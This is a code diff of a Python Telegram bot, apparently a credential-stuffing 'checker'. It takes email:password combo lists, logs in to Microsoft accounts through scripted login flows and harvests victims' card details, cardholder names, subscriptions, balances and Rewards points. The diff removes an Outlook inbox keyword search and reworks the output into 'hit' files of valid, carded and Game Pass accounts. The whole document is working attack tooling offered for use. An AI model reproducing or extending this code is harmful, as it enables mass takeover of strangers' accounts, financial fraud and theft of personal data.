@@ -8,8 +8,7 @@ import time
 import zipfile
 import shutil
 import uuid
-import imaplib
-import ssl
+import datetime
 from urllib.parse import urlparse, parse_qs, quote
 from aiohttp import web
 from aiogram import Bot, Dispatcher, types, F
@@ -27,18 +26,12 @@ MAX_CONCURRENT = 10
 TIMEOUT = 25
 TEMP_DIR = "./temp"
 
-# SFTAG (Web Login) Config
+# SFTAG Config
 SFTAG_CLIENT_ID = "00000000402B5328"
 SFTAG_URL = f"https://login.live.com/oauth20_authorize.srf?client_id={SFTAG_CLIENT_ID}&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
 ATK_CLIENT_ID = "000000000004773A"
 
-# Outlook Lite Config
-OUTLOOK_CLIENT_ID = "e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
-OUTLOOK_REDIRECT = "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"
-OUTLOOK_SCOPE = "profile openid offline_access https://outlook.office.com/M365.Access"
-
 UA_EDGE = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0"
-UA_ANDROID = "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0"
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
 log = logging.getLogger("nyx")
@@ -53,7 +46,7 @@ def parse_lr(text: str, left: str, right: str) -> str:
         return ""
 
 # ============================================================
-# FLOW 1: SFTAG WEB LOGIN & PAYMENT API
+# AUTH & API CHAIN
 # ============================================================
 async def sftag_login(session, email, password):
     headers = {"User-Agent": UA_EDGE}
@@ -99,115 +92,83 @@ async def get_pifd_atk(session):
 
 async def get_payment_data(session, atk):
     headers = {"User-Agent": UA_EDGE, "Authorization": f'MSADELEGATE1.0="{atk}"', "Accept": "application/json"}
-    cards, subs, country, balance = [], [], "Unknown", ""
+    result = {"country": "Unknown", "holder": "N/A", "cards": [], "subs": [], "balance": ""}
 
-    # 1. Cards & Country
+    # 1. Payment Instruments (Holder & Country)
     try:
         url1 = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
         async with session.get(url1, headers=headers, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
             if r.status == 200:
                 data = await r.json()
-                cc = data.get("country") or data.get("countryCode")
-                if cc: country = cc.upper()
-                bal = data.get("balance")
-                if bal: balance = str(bal)
+                result["country"] = data.get("country", "Unknown").upper()
+                result["balance"] = str(data.get("balance", ""))
                 
                 for item in data.get("items", data.get("paymentInstruments", [])):
+                    holder = item.get("accountHolderName", "")
+                    if holder and result["holder"] == "N/A": 
+                        result["holder"] = holder
+                        
                     last4 = item.get("lastFourDigits", "")
                     if last4:
-                        cards.append(f"{item.get('paymentMethodFamily', 'CC')} *{last4} ({item.get('expiryMonth', '')}/{item.get('expiryYear', '')})")
+                        result["cards"].append(f"{item.get('paymentMethodFamily', 'CC')} *{last4} ({item.get('expiryMonth', '')}/{item.get('expiryYear', '')})")
     except: pass
 
-    # 2. Subs
+    # 2. Subscriptions & Transactions
     try:
         url2 = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
         async with session.get(url2, headers=headers, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
             if r.status == 200:
                 data = await r.json()
                 for sub in data.get("subscriptions", []):
-                    title = sub.get('title', 'Subscription')
-                    price = ""
-                    billing = sub.get('billingDetails', {})
-                    if billing:
-                        amt = billing.get('totalAmount', '')
-                        cur = billing.get('currency', '')
-                        if amt and cur: price = f"({amt} {cur})"
-                    subs.append(f"{title} {price}".strip())
+                    title = sub.get("title", "Unknown Sub")
+                    auto_renew = sub.get("autoRenew", False)
+                    next_date = sub.get("nextRenewalDate", "")
+                    start_date = sub.get("startDate", "")
+                    
+                    # Calculate days left
+                    days_left = "Unknown"
+                    if next_date:
+                        try:
+                            dt = datetime.datetime.strptime(next_date.split("T")[0], "%Y-%m-%d")
+                            now = datetime.datetime.utcnow()
+                            days_left = (dt - now).days
+                        except: pass
+                        
+                    # Extract amount & currency
+                    amt = sub.get("totalAmount", "")
+                    curr = sub.get("currency", "")
+                    qty = sub.get("quantity", "1")
+                    
+                    result["subs"].append({
+                        "title": title,
+                        "auto": "Yes" if auto_renew else "No",
+                        "next_date": next_date.split("T")[0] if next_date else "N/A",
+                        "start_date": start_date.split("T")[0] if start_date else "N/A",
+                        "days": days_left,
+                        "amount": amt,
+                        "currency": curr,
+                        "qty": qty
+                    })
     except: pass
 
-    return {"cards": cards, "country": country, "balance": balance, "subs": subs}
-
-# ============================================================
-# FLOW 2: OUTLOOK OAUTH & SUBSTRATE
-# ============================================================
-async def outlook_login(session, email, password):
-    url = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={quote(email)}&mkt=en&response_type=code&client_id={OUTLOOK_CLIENT_ID}&scope={quote(OUTLOOK_SCOPE)}&redirect_uri={quote(OUTLOOK_REDIRECT)}"
-    headers = {"User-Agent": UA_ANDROID, "X-Requested-With": "com.microsoft.outlooklite"}
+    # 3. Rewards Points
+    points = "0"
     try:
-        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
-            body = await r.text()
-            post_url = parse_lr(body, 'urlPost":"', '"') or parse_lr(body, '\\"urlPost\\":\\"', '\\"')
-            ppft = parse_lr(body, 'name=\\"PPFT\\" id=\\"i0327\\" value=\\"', '\\"') or parse_lr(body, 'name="PPFT" value="', '"')
-            if not post_url or not ppft: return None
-
-            payload = f"i13=1&login={quote(email)}&loginfmt={quote(email)}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={quote(password)}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={quote(ppft)}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
-            post_headers = {"User-Agent": UA_ANDROID, "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "com.microsoft.outlooklite", "Origin": "https://login.live.com"}
-            
-            async with session.post(post_url, data=payload, headers=post_headers, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r2:
-                loc = r2.headers.get("Location", "")
-                code = parse_lr(loc, "code=", "&")
-                if not code: return None
-                
-                cid = session.cookie_jar.filter_cookies(post_url).get("MSPCID")
-                cid = cid.value.upper() if cid else ""
-                
-                token_url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
-                token_payload = f"client_info=1&client_id={OUTLOOK_CLIENT_ID}&redirect_uri={quote(OUTLOOK_REDIRECT)}&grant_type=authorization_code&code={code}&scope={quote(OUTLOOK_SCOPE)}"
-                async with session.post(token_url, data=token_payload, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r3:
-                    if r3.status == 200:
-                        data = await r3.json()
-                        return {"atk": data.get("access_token"), "cid": cid}
-    except: pass
-    return None
-
-async def search_outlook(session, atk, cid, email, keywords):
-    headers = {"Authorization": f"Bearer {atk}", "X-AnchorMailbox": f"CID:{cid}", "User-Agent": "Outlook-Android/2.0", "Content-Type": "application/json"}
-    hits = {}
-    region = "Unknown"
-    try:
-        async with session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
+        url3 = "https://rewards.bing.com/"
+        async with session.get(url3, headers={"User-Agent": UA_EDGE}, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
             if r.status == 200:
-                data = await r.json()
-                region = data.get("location", "Unknown").upper()
+                m = re.search(r'"availablePoints":(\d+)', await r.text())
+                if m: points = m.group(1)
     except: pass
+    result["points"] = points
 
-    for kw in keywords:
-        query = f"from:{kw}" if "@" in kw else kw
-        payload = {
-            "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC", "TextDecorations": "Off",
-            "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "From": 0, "Query": {"QueryString": query}, "Size": 5}],
-            "LogicalId": str(uuid.uuid4())
-        }
-        try:
-            async with session.post("https://substrate.office.com/search/api/v2/query", json=payload, headers=headers, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
-                if r.status == 200:
-                    data = await r.json()
-                    total = data.get('EntitySets', [{}])[0].get('ResultSets', [{}])[0].get('Total', 0)
-                    if total > 0:
-                        raw = json.dumps(data)
-                        uname = "Unknown"
-                        if "roblox" in kw.lower():
-                            m = re.search(r'account:\s*([a-zA-Z0-9_]+)\.', raw)
-                            if m: uname = m.group(1)
-                        hits[kw] = {"count": total, "extra": uname}
-        except: pass
-    return {"region": region, "hits": hits}
+    return result
 
 # ============================================================
 # MASTER CHECKER
 # ============================================================
-async def check_account(session, email, password, keywords):
-    res = {"email": email, "pw": password, "status": "bad", "region": "Unknown", "cards": [], "subs": [], "hits": {}, "roblox": "N/A"}
+async def check_account(session, email, password):
+    res = {"email": email, "pw": password, "status": "bad", "data": None}
     
     jar = aiohttp.CookieJar(unsafe=True)
     async with aiohttp.ClientSession(cookie_jar=jar) as sftag_session:
@@ -221,28 +182,14 @@ async def check_account(session, email, password, keywords):
         res["status"] = "valid"
         atk = await get_pifd_atk(sftag_session)
         if atk:
-            pay_data = await get_payment_data(sftag_session, atk)
-            res["region"] = pay_data["country"]
-            res["cards"] = pay_data["cards"]
-            res["subs"] = pay_data["subs"]
+            res["data"] = await get_payment_data(sftag_session, atk)
             
-    if keywords:
-        async with aiohttp.ClientSession() as out_session:
-            out_login = await outlook_login(out_session, email, password)
-            if out_login:
-                out_data = await search_outlook(out_session, out_login["atk"], out_login["cid"], email, keywords)
-                if out_data["region"] != "Unknown":
-                    res["region"] = out_data["region"]
-                res["hits"] = out_data["hits"]
-                for kw, data in out_data["hits"].items():
-                    if "roblox" in kw.lower() and data["extra"] != "Unknown":
-                        res["roblox"] = data["extra"]
     return res
 
 # ============================================================
 # PROCESSING
 # ============================================================
-async def process_combos(combos, keywords, chat_id, status_msg, bot):
+async def process_combos(combos, chat_id, status_msg, bot):
     results = []
     done, total, t_start, last_edit = 0, len(combos), time.time(), 0.0
     sem = asyncio.Semaphore(MAX_CONCURRENT)
@@ -251,8 +198,10 @@ async def process_combos(combos, keywords, chat_id, status_msg, bot):
     async with aiohttp.ClientSession(connector=connector) as session:
         async def worker(email, password):
             nonlocal done, last_edit
-            async with sem: r = await check_account(session, email, password, keywords)
-            results.append(r); done += 1
+            async with sem: 
+                r = await check_account(session, email, password)
+            results.append(r)
+            done += 1
             now = time.time()
             if now - last_edit >= 4.0 or done == total:
                 last_edit = now
@@ -277,12 +226,31 @@ async def process_combos(combos, keywords, chat_id, status_msg, bot):
 
     rich_valid = []
     for r in valid:
-        card_str = ", ".join(r["cards"]) if r["cards"] else "None"
-        sub_str = ", ".join(r["subs"]) if r["subs"] else "None"
-        hit_str = ", ".join(f"{k}({v['count']})" for k, v in r["hits"].items()) if r["hits"] else ""
-        line = f"{r['email']}:{r['pw']} | Region: {r['region']} | Cards: [{card_str}] | Subs: [{sub_str}]"
-        if hit_str: line += f" | Hits: [{hit_str}]"
-        if r["roblox"] != "N/A": line += f" | Roblox: {r['roblox']}"
+        if not r["data"]: continue
+        d = r["data"]
+        
+        # Build exact panel format
+        info1_list = []
+        info2_list = []
+        subs_list = []
+        
+        for sub in d["subs"]:
+            subs_list.append(sub["title"])
+            info1_list.append(f"Purchased Item: {sub['title']} | Auto Renew: {sub['auto']} | Next Billing: {sub['next_date']}")
+            info2_list.append(f"Product: {sub['title']} | Total Purchase: {sub['qty']} | Available Points: {d['points']} | Total Price: {sub['amount']} {sub['currency']}")
+        
+        # Main line
+        line = f"{r['email']}:{r['pw']} | Item: {', '.join(subs_list) if subs_list else 'N/A'}"
+        if d["subs"]:
+            first = d["subs"][0]
+            line += f" | Auto Renew: {first['auto']} | Next Billing: {first['next_date']} | Days Left: {first['days']}"
+        line += f" | Country: {d['country']} | Holder: {d['holder']} | Points: {d['points']}"
+        
+        if info1_list:
+            line += f" | Info 1: [ {info1_list[0]} ]"
+        if info2_list:
+            line += f" | Info 2: [ {info2_list[0]} ]"
+            
         rich_valid.append(line)
 
     write_file("valid_rich.txt", rich_valid)
@@ -290,10 +258,19 @@ async def process_combos(combos, keywords, chat_id, status_msg, bot):
     write_file("invalid.txt", [f"{r['email']}:{r['pw']}" for r in bad])
     write_file("2fa.txt", [f"{r['email']}:{r['pw']}" for r in tfa])
     
-    gp = [f"{r['email']}:{r['pw']} | {', '.join(r['subs'])}" for r in valid if any("pass" in s.lower() for s in r["subs"])]
+    # Subs & Cards
+    gp = []
+    cc = []
+    for r in valid:
+        if not r["data"]: continue
+        d = r["data"]
+        for sub in d["subs"]:
+            if "pass" in sub["title"].lower() or "game" in sub["title"].lower():
+                gp.append(f"{r['email']}:{r['pw']} | {sub['title']} | Next Billing: {sub['next_date']}")
+        if d["cards"]:
+            cc.append(f"{r['email']}:{r['pw']} | {', '.join(d['cards'])}")
+            
     if gp: write_file("gamepass.txt", gp)
-    
-    cc = [f"{r['email']}:{r['pw']} | {', '.join(r['cards'])}" for r in valid if r["cards"]]
     if cc: write_file("cards.txt", cc)
 
     write_file("summary.txt", [f"Time: {time.strftime('%Y-%m-%dT%H:%M:%S')}", f"Checked: {total}", f"Valid: {len(valid)}", f"Invalid: {len(bad)}", f"2FA: {len(tfa)}"])
@@ -317,18 +294,13 @@ dp = Dispatcher()
 @dp.message(Command("start"))
 async def cmd_start(msg: types.Message):
     if ADMIN_IDS and msg.from_user.id not in ADMIN_IDS: return await msg.answer("not authorized.")
-    await msg.answer("<b>checker</b>\n\nsend a .txt file with <code>email:password</code>\nreply with <code>/kw roblox, paypal</code> for inbox.")
+    await msg.answer("<b>checker</b>\n\nsend a .txt file with <code>email:password</code>")
 
 @dp.message(F.document)
 async def handle_file(msg: types.Message):
     if ADMIN_IDS and msg.from_user.id not in ADMIN_IDS: return
     if not msg.document.file_name.lower().endswith(".txt"): return await msg.answer("send a .txt file.")
     
-    keywords = []
-    if msg.reply_to_message and msg.reply_to_message.text and msg.reply_to_message.text.startswith("/kw"):
-        kw_str = msg.reply_to_message.text.replace("/kw", "").strip()
-        keywords = [k.strip() for k in kw_str.split(",") if k.strip()]
-        
     status = await msg.answer("downloading...")
     local = os.path.join(TEMP_DIR, f"{msg.document.file_unique_id}.txt")
     try:
@@ -346,9 +318,8 @@ async def handle_file(msg: types.Message):
     os.remove(local)
     
     if not combos: return await status.edit_text("no valid combos found.")
-    kw_msg = f" | {len(keywords)} keywords" if keywords else ""
-    await status.edit_text(f"loaded <code>{len(combos)}</code> combos{kw_msg} — starting...")
-    await process_combos(combos, keywords, msg.chat.id, status, bot)
+    await status.edit_text(f"loaded <code>{len(combos)}</code> combos — starting...")
+    await process_combos(combos, msg.chat.id, status, bot)
 
 # ============================================================
 # WEB SERVER FOR RENDER
